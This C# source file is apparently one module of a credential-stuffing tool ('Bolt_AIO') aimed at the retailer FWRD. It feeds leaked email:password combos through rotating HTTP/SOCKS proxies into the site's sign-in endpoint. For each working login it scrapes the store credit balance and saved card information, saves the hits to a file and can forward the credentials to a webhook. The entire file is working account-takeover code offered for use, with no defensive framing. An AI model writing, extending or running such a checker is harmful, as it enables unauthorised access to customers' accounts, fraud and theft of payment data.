using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class FWRDmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "NO":
                                    req.Proxy = null;
                                    break;
                            }

                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback += (obj, cert, ssl, error) =>
                                (cert as X509Certificate2).Verify();
                            req.Get("https://www.fwrd.com").ToString();
                            var str1 = "email=" + array[0] + "&pw=" + array[1] +
                                       "&g_recaptcha_response=&karmir_luys=true&rememberMe=true&isCheckout=true&saveForLater=false&fw=true";
                            var str2 = req.Post("https://www.fwrd.com/r/ajax/SignIn.jsp", str1,
                                "application/x-www-form-urlencoded").ToString();
                            if (!str2.Contains("{\"success\" : false,"))
                            {
                                if (str2.Contains("\",\"success\":true,\""))
                                {
                                    var str3 = " | Balance: " +
                                               Parse(req.Get("https://www.fwrd.com/fw/account/MyCredit.jsp").ToString(),
                                                   "Your current store credit balance is $", "</p>") + " | Card: " +
                                               Parse(
                                                   req.Get("https://www.fwrd.com/fw/account/BillingInformation.jsp")
                                                       .ToString(), "class=\"payment_info\">", "</div>");
                                    Program.TotalChecks++;
                                    Program.Hits++;
                                    Export.AsResult("/Fwrd_hits", array[0] + ":" + array[1] + str3);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("FWRD", array[0] + ":" + array[1] + str3);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1], "FWRD Hits");
                                }

                                req.Dispose();
                            }
                            else if (str2.Contains("{\"success\" : false,"))
                            {
                                Program.TotalChecks++;
                                Program.Fails++;
                                req.Dispose();
                            }
                            else
                            {
                                Program.Combos.Add(text);
                                req.Dispose();
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}